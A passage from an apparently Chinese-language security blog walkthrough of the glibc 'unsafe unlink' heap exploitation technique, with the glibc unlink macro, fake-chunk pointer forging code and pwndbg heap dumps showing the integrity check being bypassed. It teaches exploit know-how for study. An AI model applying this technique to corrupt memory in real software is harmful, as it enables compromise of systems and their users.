class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-number">1344#</span>define unlink(AV, P, BK, FD) &#123;                                            \<br><span class="hljs-symbol">1345 </span>    FD = P-&gt;fd;                                                               \<br><span class="hljs-symbol">1346 </span>    BK = P-&gt;bk;                                                               \<br><span class="hljs-symbol">1347 </span>    <span class="hljs-keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="hljs-number">0</span>))                     \<br><span class="hljs-symbol">1348 </span>      malloc_printerr (check_action, <span class="hljs-string">&quot;corrupted double-linked list&quot;</span>, P, AV);  \<br><span class="hljs-symbol">1349 </span>    <span class="hljs-keyword">else</span> &#123;                                                                    \<br><span class="hljs-symbol">1350 </span>        FD-&gt;bk = BK;                                                          \<br><span class="hljs-symbol">1351 </span>        BK-&gt;fd = FD;                                                          \<br><span class="hljs-symbol">1352 </span>        <span class="hljs-keyword">if</span> (!in_smallbin_range (P-&gt;size)                                      \<br><span class="hljs-symbol">1353 </span>            &amp;&amp; __builtin_expect (P-&gt;fd_nextsize != NULL, <span class="hljs-number">0</span>)) &#123;                \<br><span class="hljs-symbol">1354 </span>            <span class="hljs-keyword">if</span> (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, <span class="hljs-number">0</span>)        \<br><span class="hljs-symbol">1355 </span>                || __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, <span class="hljs-number">0</span>))    \<br><span class="hljs-symbol">1356 </span>              malloc_printerr (check_action,                                  \<br><span class="hljs-symbol">1357 </span>                               <span class="hljs-string">&quot;corrupted double-linked list (not small)&quot;</span>,    \<br><span class="hljs-symbol">1358 </span>                               P, AV);                                        \<br><span class="hljs-symbol">1359 </span>            <span class="hljs-keyword">if</span> (FD-&gt;fd_nextsize == NULL) &#123;                                    \<br><span class="hljs-symbol">1360 </span>                <span class="hljs-keyword">if</span> (P-&gt;fd_nextsize == P)                                      \<br><span class="hljs-symbol">1361 </span>                  FD-&gt;fd_nextsize = FD-&gt;bk_nextsize = FD;                     \<br><span class="hljs-symbol">1362 </span>                <span class="hljs-keyword">else</span> &#123;                                                        \<br><span class="hljs-symbol">1363 </span>                    FD-&gt;fd_nextsize = P-&gt;fd_nextsize;                         \<br><span class="hljs-symbol">1364 </span>                    FD-&gt;bk_nextsize = P-&gt;bk_nextsize;                         \<br><span class="hljs-symbol">1365 </span>                    P-&gt;fd_nextsize-&gt;bk_nextsize = FD;                         \<br><span class="hljs-symbol">1366 </span>                    P-&gt;bk_nextsize-&gt;fd_nextsize = FD;                         \<br><span class="hljs-symbol">1367 </span>                  &#125;                                                           \<br><span class="hljs-symbol">1368 </span>              &#125; <span class="hljs-keyword">else</span> &#123;                                                        \<br><span class="hljs-symbol">1369 </span>                P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize;                 \<br><span class="hljs-symbol">1370 </span>                P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize;                 \<br><span class="hljs-symbol">1371 </span>              &#125;                                                               \<br><span class="hljs-symbol">1372 </span>          &#125;                                                                   \<br><span class="hljs-symbol">1373 </span>      &#125;                                                                       \<br><span class="hljs-symbol">1374 </span>&#125;<br></code></pre></td></tr></table></figure><p>这里我们最主要需要绕过的地方就是(FD-&gt;bk !&#x3D; P || BK-&gt;fd !&#x3D; P)这里了,我们根据函数传进来的东西解释一下<br>FD是我们所传进来的指针P的fd指针也就是FD&#x3D;P-&gt;fd,而BK就是P-&gt;BK</p><p>也就是说,我们所需要满足的FD-&gt;bk&#x3D;P,BK-&gt;fd&#x3D;P其实就是</p><ol><li><p>P-&gt;fd-&gt;bk&#x3D;P,即程序检测P的后一个空闲指针的前一个指针为P</p></li><li><p>P-&gt;bk-&gt;fd&#x3D;P,同理检测P的前一个空闲指针的后一个指针为P</p></li></ol><p>如果我们想利用该怎么做呢?带着疑问让我们开始调试程序吧!</p><p>因为较为复杂,这里我下了8个断点,分别是</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs cpp">► <span class="hljs-number">21</span>   chunk0_ptr = (<span class="hljs-type">uint64_t</span>*) <span class="hljs-built_in">malloc</span>(malloc_size); <span class="hljs-comment">//chunk0</span><br>  <span class="hljs-number">22</span>   <span class="hljs-type">uint64_t</span> *chunk1_ptr  = (<span class="hljs-type">uint64_t</span>*) <span class="hljs-built_in">malloc</span>(malloc_size); <span class="hljs-comment">//chunk1</span><br>► <span class="hljs-number">27</span>   <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;We setup the &#x27;next_free_chunk&#x27; (fd) of our fake chunk to point near to &amp;chunk0_ptr so that P-&gt;fd-&gt;bk = P.\n&quot;</span>);<br>  <span class="hljs-number">28</span>   chunk0_ptr[<span class="hljs-number">2</span>] = (<span class="hljs-type">uint64_t</span>) &amp;chunk0_ptr-(<span class="hljs-built_in">sizeof</span>(<span class="hljs-type">uint64_t</span>)*<span class="hljs-number">3</span>);<br>► <span class="hljs-number">31</span>   chunk0_ptr[<span class="hljs-number">3</span>] = (<span class="hljs-type">uint64_t</span>) &amp;chunk0_ptr-(<span class="hljs-built_in">sizeof</span>(<span class="hljs-type">uint64_t</span>)*<span class="hljs-number">2</span>);<br>► <span class="hljs-number">36</span>   <span class="hljs-type">uint64_t</span> *chunk1_hdr = chunk1_ptr - header_size;<br>► <span class="hljs-number">39</span>   chunk1_hdr[<span class="hljs-number">0</span>] = malloc_size;<br>► <span class="hljs-number">42</span>   chunk1_hdr[<span class="hljs-number">1</span>] &amp;= ~<span class="hljs-number">1</span>;<br><br>  <span class="hljs-number">50</span>   <span class="hljs-built_in">strcpy</span>(victim_string,<span class="hljs-string">&quot;Hello!~&quot;</span>);<br>► <span class="hljs-number">51</span>   chunk0_ptr[<span class="hljs-number">3</span>] = (<span class="hljs-type">uint64_t</span>) victim_string;<br><br>  <span class="hljs-number">55</span>   chunk0_ptr[<span class="hljs-number">0</span>] = <span class="hljs-number">0x4141414142424242LL</span>;<br>► <span class="hljs-number">56</span>   <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;New Value: %s\n&quot;</span>,victim_string);<br></code></pre></td></tr></table></figure><p>首先是第一个断点的地方,也就是malloc chunk0的地方</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">pwndbg&gt; heap<br><span class="hljs-number">0x603000</span> PREV_INUSE &#123;<br>  prev_size = <span class="hljs-number">0</span>,<br>  size = <span class="hljs-number">145</span>,<br>  fd = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk </span>= <span class="hljs-number">0x0</span>,<br>  fd_nextsize = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk_nextsize </span>= <span class="hljs-number">0x0</span><br>&#125;<br><span class="hljs-number">0x603090</span> PREV_INUSE &#123;<br>  prev_size = <span class="hljs-number">0</span>,<br>  size = <span class="hljs-number">135025</span>,<br>  fd = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk </span>= <span class="hljs-number">0x0</span>,<br>  fd_nextsize = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk_nextsize </span>= <span class="hljs-number">0x0</span><br>&#125;<br></code></pre></td></tr></table></figure><p>可以看到我们已经有了一个堆块,那么下面我们单步走完下一个,即把chunk1也分配了,此时的堆块</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">pwndbg&gt; heap<br><span class="hljs-number">0x603000</span> PREV_INUSE &#123;<br>  prev_size = <span class="hljs-number">0</span>,<br>  size = <span class="hljs-number">0x91</span>,<br>  fd = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk </span>= <span class="hljs-number">0x0</span>,<br>  fd_nextsize = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk_nextsize </span>= <span class="hljs-number">0x0</span><br>&#125;<br><span class="hljs-number">0x603090</span> PREV_INUSE &#123;<br>  prev_size = <span class="hljs-number">0</span>,<br>  size = <span class="hljs-number">0x91</span>,<br>  fd = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk </span>= <span class="hljs-number">0x0</span>,<br>  fd_nextsize = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk_nextsize </span>= <span class="hljs-number">0x0</span><br>&#125;<br><span class="hljs-number">0x603120</span> PREV_INUSE &#123;<br>  prev_size = <span class="hljs-number">0</span>,<br>  size = <span class="hljs-number">134881</span>,<br>  fd = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk </span>= <span class="hljs-number">0x0</span>,<br>  fd_nextsize = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk_nextsize </span>= <span class="hljs-number">0x0</span><br>&#125;<br>pwndbg&gt;<br></code></pre></td></tr></table></figure><p>好嘞,我们到下一个断点处,没错,就是这个地方</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">► <span class="hljs-number">28</span>   chunk0_ptr[<span class="hljs-number">2</span>] = (<span class="hljs-built_in">uint64</span>_t) &amp;chunk0_ptr-(sizeof(<span class="hljs-built_in">uint64</span>_t)*<span class="hljs-number">3</span>);<br></code></pre></td></tr></table></figure><p>程序的注释中说我们将fake_chunk的fd指向我们的chunk0_ptr,我们先看看这个所谓的chunk0_ptr[2]是个什么东西:</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs dns">pwndbg&gt; p/x chunk0_ptr<br>$<span class="hljs-number">3</span> = <span class="hljs-number">0x603010</span><br>pwndbg&gt; p/x chunk0_ptr[<span class="hljs-number">2</span>]<br>$<span class="hljs-number">4</span> = <span class="hljs-number">0x602058</span><br>pwndbg&gt; p/x &amp;chunk0_ptr<br>$<span class="hljs-number">5</span> = <span class="hljs-number">0x602070</span><br>pwndbg&gt; x/<span class="hljs-number">10</span>x <span class="hljs-number">0x602070</span><br><span class="hljs-number">0x602070</span> &lt;chunk0_ptr&gt;:  <span class="hljs-number">0</span>x00000<span class="hljs-number">00000603010</span>      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br><span class="hljs-number">0x602080</span>:       <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br><span class="hljs-number">0x602090</span>:       <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br><span class="hljs-number">0x6020a0</span>:       <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br><span class="hljs-number">0x6020b0</span>:       <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br>pwndbg&gt; x/<span class="hljs-number">10</span>gx <span class="hljs-number">0x603010</span><br><span class="hljs-number">0x603010</span>:       <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br><span class="hljs-number">0x603020</span>:       <span class="hljs-number">0</span>x00000<span class="hljs-number">00000602058</span>      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br><span class="hljs-number">0x603030</span>:       <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br><span class="hljs-number">0x603040</span>:       <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br><span class="hljs-number">0x603050</span>:       <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br></code></pre></td></tr></table></figure><p>为便于理解,这里我一共输出了五样东西</p><p>可以看到,程序将chunk0_ptr[2]的值变成了chunk0_ptr-0x18的地址</p><p>记得之前所说的吗,我们需要在chunk0中伪造一个fake chunk</p><p>我们的chunk0_ptr是从0x603000开始的,但是我们要清楚的是给用户的指针却是从0x603010开始的(这其实也是glibc的机制,这里就不详述了).结合程序注释,这也就意味着我们所伪造的fake chunk要从0x603010开始,以0x603020为fd指针,以0x603028为bk指针</p><p>此时我们的fd指针已经伪造好了,下面我们直接结束伪造bk指针的部分,此时的堆</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs dns">pwndbg&gt; heap<br><span class="hljs-number">0x603000</span> PREV_INUSE &#123;<br>  prev_size = <span class="hljs-number">0</span>,<br>  size = <span class="hljs-number">145</span>,<br>  fd = <span class="hljs-number">0</span>x0,<br>  bk = <span class="hljs-number">0</span>x0,<br>  fd_nextsize = <span class="hljs-number">0x602058</span>,<br>  bk_nextsize = <span class="hljs-number">0x602060</span> &lt;stderr@@GLIBC_2.<span class="hljs-number">2</span>.<span class="hljs-number">5</span>&gt;<br>&#125;<br><span class="hljs-number">0x603090</span> PREV_INUSE &#123;<br>  prev_size = <span class="hljs-number">0</span>,<br>  size = <span class="hljs-number">145</span>,<br>  fd = <span class="hljs-number">0</span>x0,<br>  bk = <span class="hljs-number">0</span>x0,<br>  fd_nextsize = <span class="hljs-number">0</span>x0,<br>  bk_nextsize = <span class="hljs-number">0</span>x0<br>&#125;<br><span class="hljs-number">0x603120</span> PREV_INUSE &#123;<br>  prev_size = <span class="hljs-number">0</span>,<br>  size = <span class="hljs-number">134881</span>,<br>  fd = <span class="hljs-number">0</span>x0,<br>  bk = <span class="hljs-number">0</span>x0,<br>  fd_nextsize = <span class="hljs-number">0</span>x0,<br>  bk_nextsize = <span class="hljs-number">0</span>x0<br>&#125;<br>pwndbg&gt; x/<span class="hljs-number">10</span>gx <span class="hljs-number">0x603010</span><br><span class="hljs-number">0x603010</span>:       <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br><span class="hljs-number">0x603020</span>:       <span class="hljs-number">0</span>x00000<span class="hljs-number">00000602058</span>      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000602060</span><br><span class="hljs-number">0x603030</span>:       <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br><span class="hljs-number">0x603040</span>:       <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br><span class="hljs-number">0x603050</span>:       <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br></code></pre></td></tr></table></figure><p>好了,此时我们已经成功的伪造了我们fake chunk的fd和bk指针,程序注释说我们这样就可以成功bypass那两个条件,也就是P-&gt;FD-&gt;BK&#x3D;P&amp;&amp;P-&gt;BK-&gt;FD&#x3D;P了,这是为什么呢?</p><p>我们现在假设我们的fake_chunk的size已经设好了,并且他的fd&#x3D;0x602058,bk&#x3D;0x602060,那么</p><p>fake_chunk-&gt;fd-&gt;bk是多少呢?我们看一下</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs dns">pwndbg&gt; x/<span class="hljs-number">10</span>gx <span class="hljs-number">0x602058</span><br><span class="hljs-number">0x602058</span>:       <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>      <span class="hljs-number">0</span>x00007ffff7dd2540<br><span class="hljs-number">0x602068</span> :      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000603010</span>&lt;-bk<br><span class="hljs-number">0x602078</span>:       <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br><span class="hljs-number">0x602088</span>:       <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br><span class="hljs-number">0x602098</span>:       <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br></code></pre></td></tr></table></figure><p>看到了吗,此时的fake_chunk-&gt;fd-&gt;bk&#x3D;0x603010,还记得我们刚刚所说的吗,我们所伪造的fake_chunk就是0x603010</p><p>因此第一个条件fake_chunk-&gt;fd-&gt;bk&#x3D;fake_chunk达成,同理我们康康第二个条件</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs dns">pwndbg&gt; x/<span class="hljs-number">10</span>gx <span class="hljs-number">0x602060</span><br><span class="hljs-number">0x602060</span> &lt;stderr@@GLIBC_2.<span class="hljs-number">2</span>.<span class="hljs-number">5</span>&gt;: <span class="hljs-number">0</span>x00007ffff7dd2540      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br><span class="hljs-number">0x602070</span> &lt;chunk0_ptr&gt;:  <span class="hljs-number">0</span>x00000<span class="hljs-number">00000603010</span>      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br><span class="hljs-number">0x602080</span>:       <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br><span class="hljs-number">0x602090</span>:       <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br><span class="hljs-number">0x6020a0</span>:       <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br></code></pre></td></tr></table></figure><p>同样的,我们成功达成了第二个条件,此时的fake_chunk也就是指向我们全局变量的chunk0_ptr已经可以bypass了,现在值得注意的是刚刚我们假设size已经设好了,但其实并没有</p><p>那么根据程序所说,假设我们可以溢出chunk0来自由的更改chunk1的内容,我们就可以通过更改chunk1的pre_size域来使得我们的chunk收缩以骗过malloc让他认为我们的chunk1的上一个chunk是从我们的fake chunk处开始的</p><p>emmmm,关于heap shrink,可以康康我之前的另一篇<a href="https://nightrainy.github.io/2019/07/25/chunk-extend-and-overlapping/">文章</a></p><p>拓展和收缩原理相同:)</p><p>好了,我们继续</p><figure class="highlight smalltalk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs smalltalk"> <span class="hljs-number">36</span>   uint64_t *chunk1_hdr = chunk1_ptr - header_size;<br>► <span class="hljs-number">37</span>   fprintf(stderr, <span class="hljs-comment">&quot;We shrink the size of chunk0 (saved as &#x27;previous_size&#x27; in chunk1) so that free will think that chunk0 starts where we placed our fake chunk.\n&quot;</span>);<br></code></pre></td></tr></table></figure><p>现在程序运行到了这里,之前程序所定义的header_size是2,那么chunk1_ptr-2是什么东西呢?</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">pwndbg&gt; </span><span class="language-bash">p/x chunk1_ptr -2</span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">23 = 0x603090</span><br><span class="hljs-meta prompt_">pwndbg&gt; </span><span class="language-bash">p/x chunk1_ptr</span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">24 = 0x6030a0</span><br><span class="hljs-meta prompt_">pwndbg&gt; </span><span class="language-bash">p/x 0x6030a0-0x603090</span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">25 = 0x10</span><br></code></pre></td></tr></table></figure><p>这里需要注意哦,指针的加减和平常的加减不太一样,这里我也写了个小demo,其实是从之前的文章里扒来的</p><p>demo.c</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>        <span class="hljs-type">long</span> <span class="hljs-type">long</span> *chunk1,*chunk2;<br>        chunk1=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x80</span>);<br>        chunk2=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x80</span>);<br>        chunk1=<span class="hljs-number">100</span>;<br>        chunk2=<span class="hljs-number">200</span>;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%p\n&quot;</span>,&amp;chunk1);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%p\n&quot;</span>,chunk1);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%p\n&quot;</span>,&amp;chunk2);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%p\n&quot;</span>,chunk2);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%p\n&quot;</span>,chunk1<span class="hljs-number">-3</span>);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%p\n&quot;</span>,chunk1<span class="hljs-number">-2</span>);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%p\n&quot;</span>,chunk1<span class="hljs-number">-1</span>);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%p\n&quot;</span>,&amp;chunk1<span class="hljs-number">-3</span>);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%p\n&quot;</span>,&amp;chunk1<span class="hljs-number">-2</span>);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%p\n&quot;</span>,&amp;chunk1<span class="hljs-number">-1</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>编译运行结果</p><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs gauss">&#x27;╰─<span class="hljs-meta"># ./test</span><br><span class="hljs-number">0x7ffdd51db3f8</span><br><span class="hljs-number">0x64</span><br><span class="hljs-number">0x7ffdd51db400</span><br><span class="hljs-number">0xc8</span><br><span class="hljs-number">0x4c</span><br><span class="hljs-number">0x54</span><br><span class="hljs-number">0x5c</span><br><span class="hljs-number">0x7ffdd51db3e0</span> <span class="hljs-comment">//chunk1-3</span><br><span class="hljs-number">0x7ffdd51db3e8</span> <span class="hljs-comment">//chunk1-2</span><br><span class="hljs-number">0x7ffdd51db3f0</span> <span class="hljs-comment">//chunk1-1</span><br><br></code></pre></td></tr></table></figure><p>从小demo里就可以稍微理解指针加减了叭(雾</p><p>好的,下面我们继续分析.</p><p>程序做了什么呢?</p><p>程序将chunk1_ptr向前16位的地址赋给了我们的chunk1_hdr,这是做什么呢?</p><p>我们知道程序给我们的用户指针其实是free chunk的fd指针,因此向前16就意味着是chunk的pre_size域</p><p>我们继续让程序执行到给他赋值的地方,此时答案呼之欲出,这里的作用就是为了实现我们刚刚所说的堆缩,heap shrink:)</p><p>我们看下现在的堆</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">pwndbg&gt; heap<br><span class="hljs-number">0x603000</span> PREV_INUSE &#123;<br>  prev_size = <span class="hljs-number">0</span>,<br>  size = <span class="hljs-number">0x91</span>,<br>  fd = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk </span>= <span class="hljs-number">0x0</span>,<br>  fd_nextsize = <span class="hljs-number">0x602058</span>,<br>  <span class="hljs-keyword">bk_nextsize </span>= <span class="hljs-number">0x602060</span> &lt;stderr@@GLIBC_2.<span class="hljs-number">2</span>.<span class="hljs-number">5</span>&gt;<br>&#125;<br><span class="hljs-number">0x603090</span> PREV_INUSE &#123;<br>  prev_size = <span class="hljs-number">0x80</span>,<br>  size = <span class="hljs-number">0x91</span>,<br>  fd = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk </span>= <span class="hljs-number">0x0</span>,<br>  fd_nextsize = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk_nextsize </span>= <span class="hljs-number">0x0</span><br>&#125;<br><span class="hljs-number">0x603120</span> PREV_INUSE &#123;<br>  prev_size = <span class="hljs-number">0</span>,<br>  size = <span class="hljs-number">134881</span>,<br>  fd = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk </span>= <span class="hljs-number">0x0</span>,<br>  fd_nextsize = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk_nextsize </span>= <span 